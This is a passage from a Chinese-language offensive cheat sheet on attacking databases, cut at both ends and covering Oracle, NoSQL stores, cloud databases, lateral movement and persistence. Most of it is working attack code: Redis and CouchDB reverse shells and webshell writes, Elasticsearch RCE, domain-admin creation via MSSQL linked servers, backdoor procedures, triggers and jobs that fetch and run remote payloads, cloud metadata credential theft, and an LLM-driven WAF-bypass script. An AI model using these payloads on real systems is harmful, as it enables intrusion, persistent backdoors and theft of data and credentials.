EXEC CTXSYS.DRILOAD.VALIDATE_STMT('GRANT DBA TO SCOTT');

-- 如果 CTXSYS 有漏洞
-- CVE-2010-0866 / CVE-2010-0867
-- 利用 CTXSYS 包中的 SQL 注入
EXEC CTXSYS.CTX_DOC.THEMES('test','1'' union select 1 from dual --');
```

### 5.6 跨数据库链接

```sql
-- 枚举数据库链接
SELECT * FROM dba_db_links;
SELECT * FROM user_db_links;
SELECT DB_LINK, USERNAME, HOST FROM user_db_links;

-- 通过数据库链接执行查询
SELECT * FROM sensitive_table@REMOTE_DB;

-- 通过数据库链接执行 DDL
EXECUTE IMMEDIATE 'CREATE TABLE backdoor@REMOTE_DB (id NUMBER)';

-- Oracle → MSSQL 通过异构服务
-- 通过 dg4odbc 连接到 MSSQL
```

### 5.7 2026 Oracle CVE

```bash
# CVE-2024-20953 Oracle 数据库权限提升
# 利用 Oracle JVM 组件缺陷

# 2026 Oracle 新特性攻击面
# - Oracle 23ai 的 AI Vector Search 注入
# - Oracle 23ai 的 JSON Relational Duality 攻击
# - Oracle 23ai 的 Property Graph 图查询注入
# - Oracle Autonomous Database 的元数据泄露
# - Oracle Cloud 数据库的跨租户攻击
# - Oracle TDE 密钥管理绕过
# - Oracle Blockchain Table 的篡改
# - Oracle Spatial 的注入攻击
# - Oracle Text 的全文搜索注入
```

---

## 6. NoSQL 安全

### 6.1 MongoDB 未授权访问

```bash
# 连接未授权 MongoDB
mongo --host 192.168.1.1 --port 27017
mongosh mongodb://192.168.1.1:27017

# 枚举数据库
> show dbs
> use admin
> show collections
> db.system.users.find()
> db.system.version.find()

# 读取敏感数据
> use production
> db.users.find().pretty()
> db.orders.find().limit(10)

# MongoDB 写文件 (需要较高权限)
# 通过 GridFS 写入
> use admin
> db.createCollection("fs.files")
> db.createCollection("fs.chunks")

# MongoDB 执行 JavaScript (如果启用了 server-side JS)
> db.eval('return 1+1')
> db.eval('while(true){}')  # DoS
```

### 6.2 NoSQL 注入

```bash
# MongoDB NoSQL 注入 (应用程序层)
# 绕过认证
# 正常请求: {"username": "admin", "password": "password"}
# 注入: {"username": "admin", "password": {"$ne": ""}}
# 注入: {"username": {"$gt": ""}, "password": {"$gt": ""}}

# 使用 $regex 盲注
# {"username": "admin", "password": {"$regex": "^a"}}
# 逐步猜解: {"username": "admin", "password": {"$regex": "^pass"}}

# $where 注入 (如果启用了)
# {"$where": "sleep(5000)"}
# {"$where": "this.username == 'admin' && this.password[0] == 'a'"}

# Python NoSQL 注入 PoC
import requests
import string

url = "http://target.com/login"
chars = string.ascii_lowercase + string.digits
password = ""

for i in range(20):
    for c in chars:
        payload = {"username": "admin", "password": {"$regex": f"^{password}{c}"}}
        r = requests.post(url, json=payload)
        if "success" in r.text.lower():
            password += c
            print(f"Found: {password}")
            break
```

### 6.3 Redis 未授权访问

```bash
# 连接 Redis
redis-cli -h 192.168.1.1
redis-cli -h 192.168.1.1 -p 6379

# 信息收集
> INFO
> INFO server
> INFO keyspace
> CONFIG GET *
> CONFIG GET dir
> CONFIG GET dbfilename
> DBSIZE
> KEYS *

# 读取数据
> GET key_name
> LRANGE key_name 0 -1
> HGETALL key_name

# 写入 SSH 公钥
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SET ssh_key "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB...\n"
> SAVE

# 写入 Crontab
> CONFIG SET dir /var/spool/cron/crontabs
> CONFIG SET dbfilename root
> SET cron_job "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'\n\n"
> SAVE

# 写入 WebShell
> CONFIG SET dir /var/www/html
> CONFIG SET dbfilename shell.php
> SET webshell "<?php @eval(\$_POST['x']); ?>"
> SAVE

# 写入 /etc/crontab
> CONFIG SET dir /etc
> CONFIG SET dbfilename crontab
> SET cron "\n\n*/1 * * * * root bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'\n\n"
> SAVE
```

### 6.4 Redis 主从复制 RCE

```bash
# Redis 主从复制 RCE (Redis 4.x/5.x)
# 工具: Redis-Rogue-Server
git clone https://github.com/n0b0dyCN/Redis-Rogue-Server
cd Redis-Rogue-Server
python3 redis-rogue-server.py --rhost 192.168.1.1 --lhost 192.168.1.100 --lport 8888 --passwd ""

# 手动主从复制 RCE
# 1. 编译恶意模块
# 2. 设置为从服务器
redis-cli -h 192.168.1.1
> SLAVEOF 192.168.1.100 6379
> CONFIG SET dbfilename exp.so
> SLAVEOF NO ONE
> MODULE LOAD /tmp/exp.so
> system.exec "id"

# CVE-2022-0543 Redis Lua 沙箱绕过
# 影响版本: Debian/Ubuntu 打包的 Redis
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

### 6.5 CouchDB 未授权

```bash
# CouchDB 未授权访问
curl http://192.168.1.1:5984/
curl http://192.168.1.1:5984/_all_dbs
curl http://192.168.1.1:5984/_users/_all_docs

# CouchDB 查询接口
curl http://192.168.1.1:5984/database/_all_docs?include_docs=true

# CouchDB RCE (CVE-2017-12635 / CVE-2017-12636)
# 创建管理员
curl -X PUT http://192.168.1.1:5984/_users/org.couchdb.user:hacker \
  -H "Content-Type: application/json" \
  -d '{"type": "user", "name": "hacker", "roles": ["_admin"], "roles": [], "password": "password"}'

# 通过查询服务器执行命令
curl -X POST http://192.168.1.1:5984/_config/query_servers/cmd \
  -d '"/bin/bash -c \"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\""'
```

### 6.6 Elasticsearch 未授权

```bash
# Elasticsearch 枚举
curl http://192.168.1.1:9200/
curl http://192.168.1.1:9200/_cat/indices?v
curl http://192.168.1.1:9200/_search?pretty
curl http://192.168.1.1:9200/_cat/health?v
curl http://192.168.1.1:9200/_nodes?pretty

# 数据提取
curl http://192.168.1.1:9200/database/_search?q=password&pretty
curl http://192.168.1.1:9200/_search?pretty -d '{"query":{"match_all":{}}}'

# ES Groovy 沙箱绕过 (CVE-2015-1427)
curl -X POST http://192.168.1.1:9200/_search?pretty -d '{
  "script_fields": {
    "test": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
    }
  }
}'

# ES 脚本注入 (CVE-2014-3120 等)
curl -X POST http://192.168.1.1:9200/_search -d '{
  "query": {
    "match_all": {}
  },
  "script_fields": {
    "rce": {
      "script": "Runtime.getRuntime().exec(\"id\")"
    }
  }
}'
```

### 6.7 Cassandra / CQL 注入

```bash
# Cassandra 连接
cqlsh 192.168.1.1 9042

# 枚举
> DESCRIBE KEYSPACES;
> USE system;
> DESCRIBE TABLES;
> SELECT * FROM system.local;
> SELECT * FROM system.peers;

# Cassandra CQL 注入
# 正常的 CQL 查询: SELECT * FROM users WHERE username = 'admin';
# 注入:
# 1. 使用 ALLOW FILTERING 绕过
# SELECT * FROM users WHERE username = 'admin' ALLOW FILTERING;

# 2. 堆叠查询 (如果驱动支持)
# SELECT * FROM users WHERE username = 'admin'; DROP KEYSPACE sensitive;

# 3. 通过 UDF 注入 (如果启用了 Java UDF)
# CREATE FUNCTION exec(input text) RETURNS NULL ON NULL INPUT RETURNS text LANGUAGE java AS 'Runtime.getRuntime().exec(input); return input;';
# SELECT exec('id') FROM system.local;
```

---

## 7. 云数据库安全

### 7.1 AWS RDS / Aurora

```bash
# 枚举 AWS RDS
aws rds describe-db-instances --region us-east-1
aws rds describe-db-clusters --region us-east-1
aws rds describe-db-snapshots --region us-east-1 --include-shared
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <snapshot-id>

# 公共快照泄露
aws rds describe-db-snapshots --include-public --snapshot-type public

# 读取 RDS 快照
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier attacker-db \
  --db-snapshot-identifier arn:aws:rds:us-east-1:123456789012:snapshot:leaked-snapshot

# RDS IAM 认证绕过
# 如果 IAM 策略允许 rds-db:connect
aws rds generate-db-auth-token \
  --hostname mydb.xxx.us-east-1.rds.amazonaws.com \
  --port 3306 \
  --username admin

# Aurora Serverless 攻击
# 枚举 Data API 端点
aws rds-data execute-statement \
  --resource-arn arn:aws:rds:us-east-1:123456789:cluster:my-cluster \
  --secret-arn arn:aws:secretsmanager:us-east-1:123456789:secret:db-secret \
  --sql "SELECT * FROM mysql.user" \
  --database mysql

# 跨账户 RDS 快照访问
# 如果快照共享给攻击者账户
aws rds modify-db-snapshot-attribute \
  --db-snapshot-identifier <snapshot-id> \
  --attribute-name restore \
  --values-to-add <attacker-account-id>
```

### 7.2 DynamoDB

```bash
# 枚举 DynamoDB 表
aws dynamodb list-tables --region us-east-1
aws dynamodb describe-table --table-name users --region us-east-1

# 扫描数据
aws dynamodb scan --table-name users --region us-east-1
aws dynamodb query --table-name users \
  --key-condition-expression "username = :u" \
  --expression-attribute-values '{":u": {"S": "admin"}}'

# DynamoDB 注入 (通过应用程序)
# 类似 NoSQL 注入: {"username": {"S": "admin"}, "password": {"S": {"$ne": ""}}}
# PartiQL 注入
# SELECT * FROM users WHERE username = 'admin' OR '1'='1'

# DynamoDB Streams 投毒
# 如果攻击者可以写入 DynamoDB Streams
aws dynamodb put-item --table-name users \
  --item '{"username": {"S": "attacker"}, "role": {"S": "admin"}}'
```

### 7.3 Azure SQL / Cosmos DB

```bash
# Azure SQL 枚举
az sql server list
az sql db list --server <server-name>
az sql server firewall-rule list --server <server-name> -g <resource-group>

# Azure SQL 防火墙绕过
az sql server firewall-rule create \
  --resource-group <rg> \
  --server <server-name> \
  --name attacker-rule \
  --start-ip-address 0.0.0.0 \
  --end-ip-address 255.255.255.255

# Cosmos DB 枚举
az cosmosdb list
az cosmosdb show --name <account-name> --resource-group <rg>
az cosmosdb keys list --name <account-name> --resource-group <rg>

# Cosmos DB 数据访问
# 使用主密钥
# Primary Key: 从 Azure 门户或 CLI 获取
curl -X GET "https://<account>.documents.azure.com/dbs" \
  -H "authorization: <auth-token>" \
  -H "x-ms-date: <date>"

# Cosmos DB 注入
# SQL API 注入: SELECT * FROM c WHERE c.username = 'admin' OR 1=1
```

### 7.4 GCP Cloud SQL / Spanner

```bash
# Cloud SQL 枚举
gcloud sql instances list
gcloud sql databases list --instance <instance-name>
gcloud sql users list --instance <instance-name>

# Cloud SQL 导出
gcloud sql export sql <instance-name> gs://attacker-bucket/dump.sql --database <db-name>

# Spanner 枚举
gcloud spanner instances list
gcloud spanner databases list --instance <instance-name>
gcloud spanner databases execute-sql <db-name> --instance <instance-name> \
  --sql "SELECT * FROM INFORMATION_SCHEMA.TABLES"

# Cloud SQL IAM 认证滥用
gcloud sql connect <instance-name> --user <user> --database <db>
```

### 7.5 阿里云 RDS / Redis

```bash
# 阿里云 RDS 枚举
aliyun rds DescribeDBInstances --RegionId cn-hangzhou
aliyun rds DescribeAccounts --DBInstanceId <instance-id>
aliyun rds DescribeDatabases --DBInstanceId <instance-id>

# 阿里云 Redis 枚举
aliyun r-kvstore DescribeInstances --RegionId cn-hangzhou
aliyun r-kvstore DescribeSecurityIps --InstanceId <instance-id>

# 备份下载
aliyun rds DescribeBackups --DBInstanceId <instance-id>
aliyun rds DescribeBackupDownloadLink --DBInstanceId <instance-id> --BackupId <backup-id>

# 跨账号数据访问
# 如果 RAM 角色策略配置不当
```

### 7.6 云数据库元数据攻击

```bash
# SSRF 攻击云元数据服务获取数据库凭据
# AWS IMDSv1
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/rds-monitoring-role

# AWS IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure 元数据
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://database.windows.net"

# GCP 元数据
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```

---

## 8. 数据库横向移动

### 8.1 MSSQL 链接服务器 → 域控制器

```bash
# MSSQL → 链接服务器 → 域控制器
# 1. 在 MSSQL 上执行命令
EXEC xp_cmdshell 'whoami /all'

# 2. 发现链接服务器
SELECT * FROM sys.servers;
SELECT * FROM OPENQUERY("DC_LINKED", 'SELECT @@servername');

# 3. 在链接服务器上执行命令
EXEC ('EXEC xp_cmdshell ''net user hacker P@ssw0rd /add /domain''') AT [DC_LINKED]
EXEC ('EXEC xp_cmdshell ''net group "Domain Admins" hacker /add /domain''') AT [DC_LINKED]

# 4. 通过 NTLM 中继到域控
# 在 MSSQL 上执行
EXEC xp_dirtree '\\192.168.1.100\share'
# 在攻击者机器上运行 Responder 或 impacket-ntlmrelayx
impacket-ntlmrelayx -t ldap://dc.domain.com --escalate-user hacker
```

### 8.2 MySQL → SSH

```bash
# MySQL → 通过 UDF 提权 → SSH 横向
# 1. MySQL UDF 提权
mysql> SELECT sys_exec('id');
mysql> SELECT sys_exec('useradd -m backdoor');
mysql> SELECT sys_exec('echo "backdoor:password" | chpasswd');

# 2. SSH 密钥写入
mysql> SELECT sys_exec('mkdir -p /home/backdoor/.ssh');
mysql> SELECT "ssh-rsa AAAA..." INTO OUTFILE '/home/backdoor/.ssh/authorized_keys';

# 3. SSH 到其他主机
mysql> SELECT sys_exec('ssh -o StrictHostKeyChecking=no 192.168.1.2 "id"');

# 4. SSH 隧道 SOCKS 代理
mysql> SELECT sys_exec('ssh -D 1080 -f -N -o StrictHostKeyChecking=no backdoor@192.168.1.2');
```

### 8.3 PostgreSQL → 文件系统

```bash
# PostgreSQL → 文件系统 → 凭据窃取 → 横向
# 1. 读取 SSH 密钥
SELECT pg_read_file('/home/user/.ssh/id_rsa');
SELECT pg_read_file('/root/.ssh/id_rsa');

# 2. 读取配置文件
SELECT pg_read_file('/var/www/html/config.php');
SELECT pg_read_file('/var/www/html/.env');

# 3. 通过 COPY PROGRAM 横向
COPY (SELECT '') TO PROGRAM 'ssh 192.168.1.2 "id"';
COPY (SELECT '') TO PROGRAM 'scp /etc/shadow user@192.168.1.2:/tmp/';

# 4. 通过 dblink 横向到其他 PostgreSQL
CREATE EXTENSION dblink;
SELECT dblink_connect('host=192.168.1.2 dbname=postgres user=postgres password=postgres');
SELECT * FROM dblink('host=192.168.1.2', 'SELECT pg_read_file(''/etc/passwd'')') AS t(content text);
```

### 8.4 Oracle → 操作系统

```bash
# Oracle → 操作系统 → 内网横向
# 1. 通过 Java 存储过程执行命令
SELECT os_exec('whoami') FROM dual;

# 2. 通过外部表预处理器
# 创建恶意脚本
SELECT os_exec('echo "#!/bin/bash" > /tmp/scan.sh') FROM dual;
SELECT os_exec('echo "for i in 192.168.1.{1..254}; do nc -z -w 1 \$i 22 && echo \$i >> /tmp/ssh_hosts.txt; done" >> /tmp/scan.sh') FROM dual;

# 3. Oracle → 数据库链接 → 远程数据库
SELECT * FROM sensitive_table@REMOTE_DB_SERVER;

# 4. Oracle → UTL_HTTP → 内网 SSRF
SELECT UTL_HTTP.REQUEST('http://192.168.1.2:8080/') FROM dual;
```

### 8.5 云数据库 → IAM 角色

```bash
# AWS RDS → IAM 角色 → AWS 横向
# 1. 如果 RDS 实例关联了 IAM 角色
# 通过 SSRF 或 RDS 扩展访问元数据

# 2. 通过 RDS 快照获取 IAM 凭据
# 恢复他人共享的快照
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier attacker \
  --db-snapshot-identifier arn:aws:rds:us-east-1:111111111111:snapshot:public-snapshot

# 3. 通过 Redshift 访问 IAM 角色
aws redshift get-cluster-credentials \
  --db-user admin \
  --cluster-identifier my-cluster \
  --auto-create

# 4. 通过 DynamoDB Streams → Lambda → IAM 角色
# 如果控制 DynamoDB 写入，可能触发 Lambda 执行
```

---

## 9. 数据库持久化

### 9.1 存储过程后门

```sql
-- MySQL 存储过程后门
DELIMITER //
CREATE PROCEDURE persistence(IN cmd VARCHAR(1024))
SQL SECURITY DEFINER
BEGIN
    DECLARE result VARCHAR(8192);
    SET @s = CONCAT('SELECT sys_exec("', cmd, '") INTO @result');
    PREPARE stmt FROM @s;
    EXECUTE stmt;
    DEALLOCATE PREPARE stmt;
END//
DELIMITER ;

-- MSSQL 存储过程后门
CREATE PROCEDURE sp_evil_backdoor @cmd NVARCHAR(4000)
WITH EXECUTE AS OWNER
AS
BEGIN
    DECLARE @result INT;
    EXEC @result = sp_OACreate 'wscript.shell', @shell OUTPUT;
    EXEC sp_OAMethod @shell, 'run', NULL, @cmd;
END;

-- PostgreSQL 存储过程后门
CREATE OR REPLACE FUNCTION pg_backdoor(cmd TEXT) RETURNS TEXT AS $$
BEGIN
    EXECUTE 'COPY (SELECT '''') TO PROGRAM ''' || cmd || '''';
    RETURN 'ok';
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

### 9.2 触发器后门

```sql
-- MySQL 触发器后门
CREATE TRIGGER trigger_backdoor
AFTER UPDATE ON mysql.user
FOR EACH ROW
BEGIN
    DECLARE cmd VARCHAR(255);
    SET cmd = 'curl http://192.168.1.100/beacon';
    DO sys_exec(cmd);
END;

-- MSSQL DDL 触发器后门
CREATE TRIGGER ddl_backdoor
ON ALL SERVER
FOR DDL_LOGIN_EVENTS
AS
BEGIN
    DECLARE @cmd NVARCHAR(4000) = 'powershell -c "IEX(...)"';
    EXEC xp_cmdshell @cmd;
END;

-- 登录触发器后门 (MSSQL)
CREATE TRIGGER login_backdoor
ON ALL SERVER
WITH EXECUTE AS 'sa'
FOR LOGON
AS
BEGIN
    IF ORIGINAL_LOGIN() = 'sa'
    BEGIN
        EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://192.168.1.100/beacon.ps1''))"';
    END;
END;
```

### 9.3 计划任务/Agent 作业

```sql
-- MySQL Event Scheduler 后门
CREATE EVENT persistent_beacon
ON SCHEDULE EVERY 5 MINUTE
STARTS CURRENT_TIMESTAMP
DO
    CALL backdoor_proc('curl http://192.168.1.100/beacon');

-- MSSQL Agent 作业后门
EXEC msdb.dbo.sp_add_job @job_name = 'SQLAgentBackup';
EXEC msdb.dbo.sp_add_jobstep @job_name = 'SQLAgentBackup',
    @step_name = 'Beacon',
    @subsystem = 'CMDEXEC',
    @command = 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://192.168.1.100/beacon.ps1''))"';
EXEC msdb.dbo.sp_add_jobschedule @job_name = 'SQLAgentBackup',
    @name = 'Hourly',
    @freq_type = 4,
    @freq_interval = 1,
    @freq_subday_type = 8,
    @freq_subday_interval = 1;
EXEC msdb.dbo.sp_add_jobserver @job_name = 'SQLAgentBackup';

-- Oracle DBMS_SCHEDULER 后门
BEGIN
    DBMS_SCHEDULER.CREATE_JOB (
        job_name => 'ORACLE_BEACON',
        job_type => 'EXECUTABLE',
        job_action => '/bin/bash',
        number_of_arguments => 2,
        repeat_interval => 'FREQ=MINUTELY;INTERVAL=5',
        enabled => TRUE
    );
    DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('ORACLE_BEACON', 1, '-c');
    DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('ORACLE_BEACON', 2, 'curl -s http://192.168.1.100/beacon|bash');
END;
/
```

### 9.4 函数后门

```sql
-- PostgreSQL 函数后门 (通过 SECURITY DEFINER)
CREATE FUNCTION system_backdoor(cmd TEXT) RETURNS TEXT AS
$$
BEGIN
    EXECUTE 'COPY (SELECT '''') TO PROGRAM ''' || cmd || '''';
    RETURN 'Executed';
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- 伪装成正常函数
CREATE FUNCTION pg_catalog.pg_stat_get_backdoor(cmd TEXT) RETURNS TEXT AS
$$
BEGIN
    EXECUTE format('COPY (SELECT '''') TO PROGRAM %L', cmd);
    RETURN 'OK';
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- MySQL 函数后门
CREATE FUNCTION sys_status() RETURNS STRING
SONAME 'udf_backdoor.so';
```

### 9.5 视图后门

```sql
-- 创建恶意视图 (MSSQL)
CREATE VIEW sys_backdoor_view AS
SELECT * FROM OPENROWSET('SQLNCLI', 'Server=192.168.1.100;Trusted_Connection=yes;', 'SELECT 1');

-- PostgreSQL 视图后门
CREATE VIEW pg_backdoor_view AS
SELECT * FROM dblink('host=192.168.1.100 dbname=postgres', 'SELECT 1') AS t(c int);

-- 将视图伪装成系统视图
CREATE SCHEMA IF NOT EXISTS sys;
CREATE VIEW sys.dm_exec_evil AS SELECT * FROM OPENQUERY(...);
```

### 9.6 CLR 程序集持久化

```sql
-- MSSQL CLR 程序集持久化
-- 1. 编译恶意 DLL
-- 2. 标记为系统程序集 (需要 DAC 连接)
-- 3. 使程序集持久化

-- 隐藏 CLR 程序集
ALTER ASSEMBLY [CmdExec] WITH VISIBILITY = OFF;
-- 但仍然可以通过 sys.assemblies 查看

-- 将 CLR 程序集添加到系统存储过程
CREATE PROCEDURE sp_evil_extended
AS EXTERNAL NAME [CmdExec].[StoredProcedures].[cmdExec];
```

### 9.7 复制/CDC 持久化

```sql
-- MySQL 复制持久化
-- 在从服务器上创建恶意触发器
-- 主服务器上的更改将同步到从服务器

-- MSSQL CDC 变更数据捕获持久化
-- 启用 CDC
EXEC sys.sp_cdc_enable_db;
EXEC sys.sp_cdc_enable_table
    @source_schema = 'dbo',
    @source_name = 'users',
    @role_name = NULL;

-- 在 CDC 捕获实例上创建恶意触发器
CREATE TRIGGER cdc_backdoor ON cdc.dbo_users_CT
AFTER INSERT
AS
BEGIN
    EXEC xp_cmdshell 'powershell -c "IEX(...)"';
END;
```

---

## 10. 2026 最新攻击技术

### 10.1 AI 辅助 SQL 注入

```bash
# AI 驱动的 SQL 注入测试
# 1. 使用 LLM 生成大量变体 Payload
# 2. 利用 AI 分析 WAF 响应模式
# 3. 自动适应过滤规则

# AI 盲注自动化脚本示例
# ai_sqli.py
import openai
import requests

def generate_payload(context, blocked_payloads):
    prompt = f"""
    Generate a SQL injection payload that bypasses WAF.
    Context: {context}
    Previously blocked: {blocked_payloads}
    Target: MySQL 8.0
    """
    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[{"role": "user", "content": prompt}]
    )
    return response.choices[0].message.content

# AI 驱动的 WAF 绕过
# 利用 LLM 理解 WAF 规则语义
# 生成语义等价但语法不同的 Payload
# 例如: UNION SELECT → /*!50000UnIoN*/ /*!50000SeLeCt*/
```

### 10.2 LLM 生成的 NoSQL 注入

```bash
# LLM 生成的 NoSQL 注入 Payload
# MongoDB:
# {"$where": "function(){ var x = this.password; return x.length == 10; }"}
# {"username": {"$regex": "^a"}, "password": {"$ne": ""}}
# {"$where": "this.username.match(/^a/) && sleep(5000)"}

# AI 生成的 MongoDB 聚合注入
# db.collection.aggregate([
#   {"$match": {"username": {"$where": "this.password[0] == 'a'"}}},
#   {"$group": {"_id": null, "results": {"$push": "$$ROOT"}}}
# ])

# LLM 生成的多级 NoSQL 注入链
# 利用 $lookup 进行跨集合注入
# 利用 $merge 进行数据投毒
```

### 10.3 云数据库元数据攻击

```bash
# 云数据库元数据服务攻击
# 1. AWS RDS 元数据泄露
# 通过 SQL 注入触发 SSRF 访问 169.254.169.254
CREATE FUNCTION fetch_metadata() RETURNS TEXT AS $$
BEGIN
    RETURN pg_read_file('/proc/self/environ');
    -- 或通过 PL/Python
    -- import urllib.request
    -- return urllib.request.urlopen('http://169.254.169.254/latest/meta-data/').read()
END;
$$ LANGUAGE plpgsql;

# 2. Azure SQL 元数据
# 通过 CLR 访问 Azure Instance Metadata Service
EXEC sp_execute_external_script
    @language = N'Python',
    @script = N'
import urllib.request
token = urllib.request.urlopen("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://database.windows.net", headers={"Metadata": "true"}).read()
print(token)
';

# 3. GCP Cloud SQL 元数据
# 通过 COPY PROGRAM 访问元数据
COPY (SELECT '') TO PROGRAM 'curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token';
```

### 10.4 向量数据库攻击

```bash
# Pinecone 向量数据库攻击
# 1. API Key 泄露
# 搜索 Pinecone API Key
grep -r "pinecone" ~/.bash_history
grep -r "PINECONE_API_KEY" /var/www/
find / -name ".env" -exec grep -l "PINECONE" {} \;

# 2. Pinecone 索引数据投毒
# 通过 API 注入恶意向量
import pinecone
pinecone.init(api_key="leaked-key", environment="us-west1-gcp")
index = pinecone.Index("my-index")
# 注入恶意向量
index.upsert(vectors=[("evil_id", [0.1]*1536, {"cmd": "rm -rf /"})])

# 3. Pinecone 查询注入
# 通过精心构造的向量查询绕过内容过滤
# 利用向量相似度算法缺陷

# Weaviate 向量数据库攻击
# 1. GraphQL 接口注入
# 2. 模块注入 (通过 text2vec, generative 等模块)
# 3. 备份窃取
curl http://weaviate:8080/v1/backups/files
curl -X POST http://weaviate:8080/v1/backups/db -d '{"id": "backup-leak"}'

# Milvus 向量数据库攻击
# 1. 未授权访问
# 2. 集合数据泄露
# 3. 索引投毒
# 通过 Milvus SDK 直接操作
from pymilvus import connections, Collection
connections.connect(host="192.168.1.1", port="19530")
collections = utility.list_collections()
for c in collections:
    col = Collection(c)
    col.load()
    res = col.query(expr="id >= 0", output_fields=["*"])
    print(res)
```

### 10.5 图数据库注入

```bash
# Neo4j 图数据库注入
# 1. Cypher 注入
# 正常查询: MATCH (u:User {name: 'admin'}) RETURN u
# 注入: MATCH (u:User) WHERE u.name = 'admin' OR 1=1 RETURN u
# 注入: MATCH (u:User) RETURN u UNION MATCH (n) RETURN n

# 2. APOC 扩展利用 (CVE-2021-34371 等)
CALL apoc.load.json("http://192.168.1.100/evil.json")
CALL apoc.convert.toJson([1,2,3])

# 3. Neo4j 浏览器 SSRF
CALL dbms.security.createUser("hacker", "password")
CALL dbms.security.addRoleToUser("admin", "hacker")

# 4. 通过 LOAD CSV 注入
LOAD CSV FROM 'http://192.168.1.100/evil.csv' AS row
CREATE (:User {name: row[0], role: row[1]});

# Amazon Neptune 图数据库攻击
# 1. Gremlin 注入
# g.V().hasLabel('user').has('name', 'admin').valueMap()
# 注入: g.V().hasLabel('user').valueMap().limit(99999)

# 2. SPARQL 注入
# AWS Neptune 支持 SPARQL
# SELECT ?s ?p ?o WHERE { ?s ?p ?o } LIMIT 100

# 3. Neptune IAM 角色滥用
# 如果 Neptune 集群关联了 IAM 角色
aws neptune-db execute-gremlin-query \
  --query "g.V().count()" \
  --cluster-endpoint my-neptune.cluster-xxx.us-east-1.neptune.amazonaws.com
```

### 10.6 时序数据库攻击

```bash
# TimescaleDB (PostgreSQL 扩展) 攻击
# 1. 利用 PostgreSQL 的攻击面
# 2. TimescaleDB 特有的连续聚合注入
# 3. 压缩策略投毒

# TimescaleDB 连续聚合投毒
CREATE MATERIALIZED VIEW malicious_agg
WITH (timescaledb.continuous) AS
SELECT time_bucket('1 hour', time) AS bucket,
       malicious_function(metric) AS result
FROM metrics
GROUP BY bucket;

# InfluxDB 攻击
# 1. 未授权访问
curl http://192.168.1.1:8086/query?q=SHOW+DATABASES
curl http://192.168.1.1:8086/query?db=_internal&q=SHOW+MEASUREMENTS

# 2. InfluxQL 注入
# q=SELECT * FROM "measurement" WHERE "user" = 'admin' OR 1=1

# 3. Flux 语言注入 (InfluxDB 2.x)
# from(bucket: "my-bucket")
#   |> range(start: -1h)
#   |> filter(fn: (r) => r._measurement == "users" and r._field == "password")

# 4. InfluxDB 写入投毒
curl -X POST http://192.168.1.1:8086/write?db=mydb \
  --data-binary 'evil,host=attacker value=1'
```

---

## 11. 数据库审计工具

### 11.1 SQLMap

```bash
# SQLMap 基础使用
sqlmap -u "http://target.com/page.php?id=1"
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# SQLMap 高级选项
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between
sqlmap -u "http://target.com/page.php?id=1" --os-shell
sqlmap -u "http://target.com/page.php?id=1" --os-pwn
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
sqlmap -u "http://target.com/page.php?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"

# SQLMap 绕过 WAF
sqlmap -u "http://target.com/page.php?id=1" --tamper=apostrophemask,base64encode,between,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor

# SQLMap 批量扫描
sqlmap -m urls.txt --batch --dbs
```

### 11.2 NoSQLMap

```bash
# NoSQLMap 使用
git clone https://github.com/codingo/NoSQLMap
cd NoSQLMap
python3 nosqlmap.py

# NoSQLMap 菜单选项:
# 1 - MongoDB 扫描
# 2 - CouchDB 扫描
# 3 - 自定义注入
```

### 11.3 Nmap 数据库脚本

```bash
# Nmap 数据库审计脚本集合
# MySQL
nmap -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 192.168.1.1

# MSSQL
nmap -p 1433 --script ms-sql-brute,ms-sql-config,ms-sql-dac,ms-sql-dump-hashes,ms-sql-empty-password,ms-sql-hasdbaccess,ms-sql-info,ms-sql-ntlm-info,ms-sql-query,ms-sql-tables,ms-sql-xp-cmdshell 192.168.1.1

